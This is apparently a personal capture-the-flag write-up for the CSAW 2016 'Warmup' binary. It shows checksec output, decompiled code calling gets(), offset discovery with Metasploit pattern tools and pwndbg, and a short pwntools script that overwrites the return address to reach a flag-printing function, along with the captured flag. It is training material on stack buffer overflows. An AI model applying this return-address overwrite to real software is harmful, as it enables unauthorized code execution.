# Warmup - nightmare

```console
matan@matan:~/Documents/hacking/nightmare/stackoverflow/Csaw_2016_Quals_Warmup$ file warmup 
warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped
matan@matan:~/Documents/hacking/nightmare/stackoverflow/Csaw_2016_Quals_Warmup$ checksec --file=warmup
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No Symbols	  No	0		2		warmup

matan@matan:~/Documents/hacking/nightmare/stackoverflow/Csaw_2016_Quals_Warmup$ ./warmup as
-Warm Up-
WOW:0x40060d
>sssss

```

Lets reverse it:
```c
void FUN_0040061d(void)

{
  char local_88 [64];
  char local_48 [64];
  
  write(1,"-Warm Up-\n",10);
  write(1,&DAT_0040074c,4);
  sprintf(local_88,"%p\n",FUN_0040060d);
  write(1,local_88,9);
  write(1,&DAT_00400755,1);
  gets(local_48);
  return;
}
```
we can see that we can overflow with `gets(local_48);` and override the RIP with pointer to FUN_0040060d(function that print the flag):

let check what is the offset
option 1 - get offset using error based technique
1. create pattern
```console
usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
```
2. run the program with gdb and push the payload above and finsh the program, we can see the value of RIP is ovveride
```
   0x4006a3    leave  
 ► 0x4006a4    ret    <0x6341356341346341>
```
3. lets check the offset
```console
matan@matan:~/Documents/hacking/nightmare/stackoverflow/Csaw_2016_Quals_Warmup$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 150 -q 6341356341346341
[*] Exact match at offset 72
```

option 2 - calculate ofsset:
1. enter "ABCD" to program
```
pwndbg> r
Starting program: /home/matan/Documents/hacking/nightmare/stackoverflow/Csaw_2016_Quals_Warmup/warmup 
-Warm Up-
WOW:0x40060d
>ABCD
```

2. search "ABCD" -> 0x7fffffffde80
```
pwndbg> search ABCD
[heap]          0x6022a0 0xa44434241 /* 'ABCD\n' */
libc-2.31.so    0x7ffff7f6cea1 0x4847464544434241 ('ABCDEFGH')
libc-2.31.so    0x7ffff7f7bbcc 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
libc-2.31.so    0x7ffff7f7bc6a 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
libc-2.31.so    0x7ffff7f7bcba 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
[stack]         0x7fffffffde80 0x44434241 /* 'ABCD' */
pwndbg> 
```

3. check RIP value -> 0x7fffffffdec8
```
pwndbg> retaddr 
0x7fffffffdec8 —▸ 0x7ffff7e14d0a (__libc_start_main+234) ◂— mov    edi, eax
0x7fffffffdf98 —▸ 0x400549 ◂— 0xb80000441f0f66f4
```
4. calc -> 0x7fffffffdec8 -  0x7fffffffde80 = 0x48 => `72`

Now that we know what is the offset we can create our exploit
```python
from pwn import process,packing


def exploit():
    buffer = b'A' * 72 + packing.p64(0x40060d)
    prs = process("warmup")
    prs.sendline(buffer)
    prs.interactive()

if __name__ == '__main__':
    exploit()
```
result:
```console
python warmup.py
[+] Starting local process '/home/matan/Documents/hacking/nightmare/stackoverflow/Csaw_2016_Quals_Warmup/warmup': pid 50192
[*] Switching to interactive mode
-Warm Up-
WOW:0x40060d
>FLAG{LET_US_BEGIN_CSAW_2016}
[*] Got EOF while reading in interactive
```



